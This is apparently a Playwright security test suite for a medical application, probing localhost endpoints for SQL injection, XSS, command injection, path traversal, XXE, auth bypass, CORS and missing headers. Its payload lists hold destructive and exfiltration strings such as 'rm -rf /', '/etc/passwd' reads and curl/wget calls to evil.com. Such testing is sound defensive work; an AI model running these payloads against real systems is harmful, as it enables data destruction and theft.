// MedinovAI Security Test Suite
// Comprehensive security testing for all critical vulnerabilities identified

const { test, expect, chromium } = require('@playwright/test');
const fs = require('fs');
const path = require('path');

// Security test configuration
const SECURITY_CONFIG = {
  baseURL: process.env.MEDINOVAI_BASE_URL || 'http://localhost:3000',
  apiBaseURL: process.env.MEDINOVAI_API_URL || 'http://localhost:8080',
  timeout: 30000,
  retries: 2,
  workers: 2, // Reduced for security tests
  reporter: [
    ['html', { outputFolder: 'security-test-results/html' }],
    ['json', { outputFile: 'security-test-results/security-results.json' }],
    ['junit', { outputFile: 'security-test-results/security-junit.xml' }]
  ]
};

// Security test data
const SECURITY_PAYLOADS = {
  sqlInjection: [
    "'; DROP TABLE patients; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "admin'; DELETE FROM patients WHERE '1'='1",
    "' OR 1=1 --",
    "'; INSERT INTO patients (name) VALUES ('hacked'); --"
  ],
  xss: [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>"
  ],
  commandInjection: [
    "; rm -rf /",
    "| cat /etc/passwd",
    "&& whoami",
    "; ls -la",
    "| curl http://evil.com/steal",
    "; wget http://evil.com/malware"
  ],
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd"
  ],
  ldapInjection: [
    "*)(uid=*))(|(uid=*",
    "*)(|(password=*))",
    "*)(|(objectClass=*))",
    "*)(|(cn=*))"
  ],
  xmlInjection: [
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/steal'>]><foo>&xxe;</foo>",
    "<?xml version='1.0'?><foo><!ENTITY xxe SYSTEM 'file:///etc/passwd'>&xxe;</foo>"
  ]
};

// Security test utilities
class SecurityTestManager {
  constructor() {
    this.vulnerabilities = [];
    this.testResults = [];
  }

  async logVulnerability(type, severity, description, payload, response) {
    const vulnerability = {
      type,
      severity,
      description,
      payload,
      response: response ? response.substring(0, 500) : null,
      timestamp: new Date().toISOString(),
      testId: `${type}_${Date.now()}`
    };
    
    this.vulnerabilities.push(vulnerability);
    
    // Log to console
    console.log(`🚨 VULNERABILITY DETECTED: ${type} (${severity})`);
    console.log(`   Description: ${description}`);
    console.log(`   Payload: ${payload}`);
    
    // Save to file
    await this.saveVulnerabilityReport();
  }

  async saveVulnerabilityReport() {
    const report = {
      timestamp: new Date().toISOString(),
      totalVulnerabilities: this.vulnerabilities.length,
      vulnerabilities: this.vulnerabilities,
      summary: this.generateSummary()
    };
    
    fs.writeFileSync(
      'security-test-results/vulnerability-report.json',
      JSON.stringify(report, null, 2)
    );
  }

  generateSummary() {
    const summary = {
      critical: 0,
      high: 0,
      medium: 0,
      low: 0,
      byType: {}
    };
    
    this.vulnerabilities.forEach(vuln => {
      summary[vuln.severity.toLowerCase()]++;
      summary.byType[vuln.type] = (summary.byType[vuln.type] || 0) + 1;
    });
    
    return summary;
  }

  async testSQLInjection(page, endpoint, method = 'GET') {
    console.log(`🔍 Testing SQL injection on ${endpoint}`);
    
    for (const payload of SECURITY_PAYLOADS.sqlInjection) {
      try {
        let response;
        
        if (method === 'GET') {
          response = await page.goto(`${SECURITY_CONFIG.apiBaseURL}${endpoint}?q=${encodeURIComponent(payload)}`);
        } else {
          response = await page.request.post(`${SECURITY_CONFIG.apiBaseURL}${endpoint}`, {
            data: { query: payload }
          });
        }
        
        const content = await response.text();
        
        // Check for SQL error indicators
        const sqlErrors = [
          'SQL syntax',
          'mysql_fetch',
          'ORA-01756',
          'Microsoft OLE DB',
          'PostgreSQL query failed',
          'Warning: mysql_',
          'valid MySQL result',
          'MySqlClient.',
          'SQLite3::SQLException',
          'sqlite3.OperationalError'
        ];
        
        const hasError = sqlErrors.some(error => content.toLowerCase().includes(error.toLowerCase()));
        
        if (hasError) {
          await this.logVulnerability(
            'SQL_INJECTION',
            'CRITICAL',
            `SQL injection vulnerability detected in ${endpoint}`,
            payload,
            content
          );
        }
      } catch (error) {
        // Some errors might indicate successful injection
        if (error.message.includes('timeout') || error.message.includes('ECONNRESET')) {
          await this.logVulnerability(
            'SQL_INJECTION',
            'HIGH',
            `Potential SQL injection causing connection issues in ${endpoint}`,
            payload,
            error.message
          );
        }
      }
    }
  }

  async testXSS(page, endpoint) {
    console.log(`🔍 Testing XSS on ${endpoint}`);
    
    for (const payload of SECURITY_PAYLOADS.xss) {
      try {
        // Test reflected XSS
        const response = await page.goto(`${SECURITY_CONFIG.apiBaseURL}${endpoint}?search=${encodeURIComponent(payload)}`);
        const content = await response.text();
        
        // Check if payload is reflected unescaped
        if (content.includes(payload) && !content.includes('&lt;script&gt;')) {
          await this.logVulnerability(
            'XSS_REFLECTED',
            'HIGH',
            `Reflected XSS vulnerability detected in ${endpoint}`,
            payload,
            content.substring(0, 1000)
          );
        }
        
        // Test stored XSS
        const postResponse = await page.request.post(`${SECURITY_CONFIG.apiBaseURL}${endpoint}`, {
          data: { comment: payload, name: 'Test User' }
        });
        
        if (postResponse.ok()) {
          const getResponse = await page.goto(`${SECURITY_CONFIG.apiBaseURL}${endpoint}`);
          const getContent = await getResponse.text();
          
          if (getContent.includes(payload) && !getContent.includes('&lt;script&gt;')) {
            await this.logVulnerability(
              'XSS_STORED',
              'CRITICAL',
              `Stored XSS vulnerability detected in ${endpoint}`,
              payload,
              getContent.substring(0, 1000)
            );
          }
        }
      } catch (error) {
        console.log(`XSS test error for ${endpoint}: ${error.message}`);
      }
    }
  }

  async testCommandInjection(page, endpoint) {
    console.log(`🔍 Testing command injection on ${endpoint}`);
    
    for (const payload of SECURITY_PAYLOADS.commandInjection) {
      try {
        const response = await page.request.post(`${SECURITY_CONFIG.apiBaseURL}${endpoint}`, {
          data: { 
            command: `ping ${payload}`,
            host: 'localhost'
          }
        });
        
        const content = await response.text();
        
        // Check for command execution indicators
        const indicators = [
          'uid=',
          'gid=',
          'groups=',
          'root:',
          'bin:',
          'daemon:',
          'total ',
          'drwx',
          '-rw-',
          'PING',
          'bytes from'
        ];
        
        const hasIndicator = indicators.some(indicator => content.includes(indicator));
        
        if (hasIndicator) {
          await this.logVulnerability(
            'COMMAND_INJECTION',
            'CRITICAL',
            `Command injection vulnerability detected in ${endpoint}`,
            payload,
            content
          );
        }
      } catch (error) {
        console.log(`Command injection test error for ${endpoint}: ${error.message}`);
      }
    }
  }

  async testAuthenticationBypass(page) {
    console.log(`🔍 Testing authentication bypass`);
    
    const bypassAttempts = [
      { username: 'admin', password: "' OR '1'='1" },
      { username: "' OR '1'='1", password: 'anything' },
      { username: 'admin', password: 'admin' },
      { username: 'administrator', password: 'password' },
      { username: 'root', password: 'root' },
      { username: 'test', password: 'test' }
    ];
    
    for (const attempt of bypassAttempts) {
      try {
        const response = await page.request.post(`${SECURITY_CONFIG.apiBaseURL}/api/auth/login`, {
          data: attempt
        });
        
        if (response.ok()) {
          const data = await response.json();
          
          if (data.token || data.success || data.authenticated) {
            await this.logVulnerability(
              'AUTH_BYPASS',
              'CRITICAL',
              `Authentication bypass successful with credentials: ${attempt.username}/${attempt.password}`,
              JSON.stringify(attempt),
              JSON.stringify(data)
            );
          }
        }
      } catch (error) {
        console.log(`Auth bypass test error: ${error.message}`);
      }
    }
  }

  async testAuthorizationBypass(page) {
    console.log(`🔍 Testing authorization bypass`);
    
    // Test accessing admin endpoints without proper authorization
    const adminEndpoints = [
      '/api/admin/users',
      '/api/admin/settings',
      '/api/admin/logs',
      '/api/admin/backup',
      '/api/admin/restore'
    ];
    
    for (const endpoint of adminEndpoints) {
      try {
        const response = await page.request.get(`${SECURITY_CONFIG.apiBaseURL}${endpoint}`);
        
        if (response.ok()) {
          await this.logVulnerability(
            'AUTHZ_BYPASS',
            'HIGH',
            `Unauthorized access to admin endpoint: ${endpoint}`,
            endpoint,
            await response.text()
          );
        }
      } catch (error) {
        console.log(`Authz bypass test error for ${endpoint}: ${error.message}`);
      }
    }
  }

  async testDataExposure(page) {
    console.log(`🔍 Testing for data exposure`);
    
    // Test for sensitive data in responses
    const sensitiveEndpoints = [
      '/api/patients',
      '/api/users',
      '/api/logs',
      '/api/config',
      '/api/health'
    ];
    
    for (const endpoint of sensitiveEndpoints) {
      try {
        const response = await page.request.get(`${SECURITY_CONFIG.apiBaseURL}${endpoint}`);
        const content = await response.text();
        
        // Check for sensitive data patterns
        const sensitivePatterns = [
          /password["\s]*[:=]["\s]*[^"'\s,}]+/gi,
          /token["\s]*[:=]["\s]*[^"'\s,}]+/gi,
          /key["\s]*[:=]["\s]*[^"'\s,}]+/gi,
          /secret["\s]*[:=]["\s]*[^"'\s,}]+/gi,
          /ssn["\s]*[:=]["\s]*[^"'\s,}]+/gi,
          /credit["\s]*card["\s]*[:=]["\s]*[^"'\s,}]+/gi
        ];
        
        for (const pattern of sensitivePatterns) {
          const matches = content.match(pattern);
          if (matches) {
            await this.logVulnerability(
              'DATA_EXPOSURE',
              'HIGH',
              `Sensitive data exposure detected in ${endpoint}`,
              matches[0],
              content.substring(0, 1000)
            );
          }
        }
      } catch (error) {
        console.log(`Data exposure test error for ${endpoint}: ${error.message}`);
      }
    }
  }
}

// Security test suites
test.describe('Critical Security Vulnerabilities', () => {
  let securityManager;
  let page;

  test.beforeAll(async () => {
    securityManager = new SecurityTestManager();
    
    // Create security test results directory
    if (!fs.existsSync('security-test-results')) {
      fs.mkdirSync('security-test-results', { recursive: true });
    }
  });

  test.beforeEach(async ({ browser }) => {
    const context = await browser.newContext({
      // Disable JavaScript for some tests
      javaScriptEnabled: true,
      // Set user agent
      userAgent: 'Mozilla/5.0 (Security Test Bot) AppleWebKit/537.36'
    });
    page = await context.newPage();
  });

  test.afterEach(async () => {
    await page.close();
  });

  test('SQL Injection Testing', async () => {
    const endpoints = [
      '/api/patients',
      '/api/users',
      '/api/search',
      '/api/query'
    ];
    
    for (const endpoint of endpoints) {
      await securityManager.testSQLInjection(page, endpoint, 'GET');
      await securityManager.testSQLInjection(page, endpoint, 'POST');
    }
  });

  test('XSS Testing', async () => {
    const endpoints = [
      '/api/search',
      '/api/comments',
      '/api/feedback',
      '/api/contact'
    ];
    
    for (const endpoint of endpoints) {
      await securityManager.testXSS(page, endpoint);
    }
  });

  test('Command Injection Testing', async () => {
    const endpoints = [
      '/api/ping',
      '/api/traceroute',
      '/api/system',
      '/api/exec'
    ];
    
    for (const endpoint of endpoints) {
      await securityManager.testCommandInjection(page, endpoint);
    }
  });

  test('Authentication Bypass Testing', async () => {
    await securityManager.testAuthenticationBypass(page);
  });

  test('Authorization Bypass Testing', async () => {
    await securityManager.testAuthorizationBypass(page);
  });

  test('Data Exposure Testing', async () => {
    await securityManager.testDataExposure(page);
  });

  test('CORS Misconfiguration Testing', async ({ request }) => {
    console.log(`🔍 Testing CORS misconfiguration`);
    
    const corsHeaders = [
      'Access-Control-Allow-Origin',
      'Access-Control-Allow-Credentials',
      'Access-Control-Allow-Methods',
      'Access-Control-Allow-Headers'
    ];
    
    try {
      const response = await request.get(`${SECURITY_CONFIG.apiBaseURL}/api/patients`, {
        headers: {
          'Origin': 'http://evil.com',
          'Access-Control-Request-Method': 'POST',
          'Access-Control-Request-Headers': 'Content-Type'
        }
      });
      
      const headers = response.headers();
      
      // Check for wildcard CORS
      if (headers['access-control-allow-origin'] === '*') {
        await securityManager.logVulnerability(
          'CORS_MISCONFIG',
          'HIGH',
          'Wildcard CORS policy detected',
          'Access-Control-Allow-Origin: *',
          JSON.stringify(headers)
        );
      }
      
      // Check for credentials with wildcard origin
      if (headers['access-control-allow-origin'] === '*' && 
          headers['access-control-allow-credentials'] === 'true') {
        await securityManager.logVulnerability(
          'CORS_MISCONFIG',
          'CRITICAL',
          'Wildcard CORS with credentials enabled',
          'Access-Control-Allow-Origin: * + Access-Control-Allow-Credentials: true',
          JSON.stringify(headers)
        );
      }
    } catch (error) {
      console.log(`CORS test error: ${error.message}`);
    }
  });

  test('Security Headers Testing', async ({ request }) => {
    console.log(`🔍 Testing security headers`);
    
    const requiredHeaders = [
      'X-Content-Type-Options',
      'X-Frame-Options',
      'X-XSS-Protection',
      'Strict-Transport-Security',
      'Content-Security-Policy',
      'Referrer-Policy'
    ];
    
    try {
      const response = await request.get(`${SECURITY_CONFIG.apiBaseURL}/api/health`);
      const headers = response.headers();
      
      for (const header of requiredHeaders) {
        if (!headers[header.toLowerCase()]) {
          await securityManager.logVulnerability(
            'MISSING_SECURITY_HEADER',
            'MEDIUM',
            `Missing security header: ${header}`,
            header,
            JSON.stringify(headers)
          );
        }
      }
    } catch (error) {
      console.log(`Security headers test error: ${error.message}`);
    }
  });

  test('Rate Limiting Testing', async ({ request }) => {
    console.log(`🔍 Testing rate limiting`);
    
    const requests = [];
    
    // Make 100 rapid requests
    for (let i = 0; i < 100; i++) {
      requests.push(
        request.get(`${SECURITY_CONFIG.apiBaseURL}/api/patients`)
      );
    }
    
    try {
      const responses = await Promise.all(requests);
      const rateLimitedResponses = responses.filter(r => r.status() === 429);
      
      if (rateLimitedResponses.length === 0) {
        await securityManager.logVulnerability(
          'NO_RATE_LIMITING',
          'MEDIUM',
          'No rate limiting detected',
          '100 rapid requests',
          `All ${responses.length} requests succeeded`
        );
      }
    } catch (error) {
      console.log(`Rate limiting test error: ${error.message}`);
    }
  });
});

// Performance and load testing for security
test.describe('Security Performance Testing', () => {
  test('DoS Attack Simulation', async ({ browser }) => {
    console.log(`🔍 Testing DoS attack resistance`);
    
    const contexts = [];
    const pages = [];
    
    // Create multiple browser contexts
    for (let i = 0; i < 20; i++) {
      const context = await browser.newContext();
      const page = await context.newPage();
      contexts.push(context);
      pages.push(page);
    }
    
    // Simulate concurrent requests
    const requests = pages.map(async (page, index) => {
      const startTime = Date.now();
      
      try {
        await page.goto(`${SECURITY_CONFIG.apiBaseURL}/api/patients`);
        const responseTime = Date.now() - startTime;
        
        return {
          index,
          responseTime,
          success: true
        };
      } catch (error) {
        return {
          index,
          responseTime: Date.now() - startTime,
          success: false,
          error: error.message
        };
      }
    });
    
    const results = await Promise.all(requests);
    
    // Analyze results
    const successfulRequests = results.filter(r => r.success).length;
    const avgResponseTime = results.reduce((sum, r) => sum + r.responseTime, 0) / results.length;
    
    // Check if system is overwhelmed
    if (successfulRequests < results.length * 0.8) {
      console.log(`🚨 DoS vulnerability detected: ${successfulRequests}/${results.length} requests succeeded`);
    }
    
    // Cleanup
    await Promise.all(contexts.map(context => context.close()));
    
    expect(successfulRequests).toBeGreaterThan(results.length * 0.8);
    expect(avgResponseTime).toBeLessThan(10000); // Should respond within 10 seconds
  });
});

// Global test hooks
test.beforeAll(async () => {
  console.log('🔒 Starting comprehensive security test suite...');
});

test.afterAll(async () => {
  console.log('🔒 Security test suite completed');
  console.log('📊 Check security-test-results/ for detailed vulnerability reports');
});

module.exports = {
  SecurityTestManager,
  SECURITY_PAYLOADS,
  SECURITY_CONFIG
};
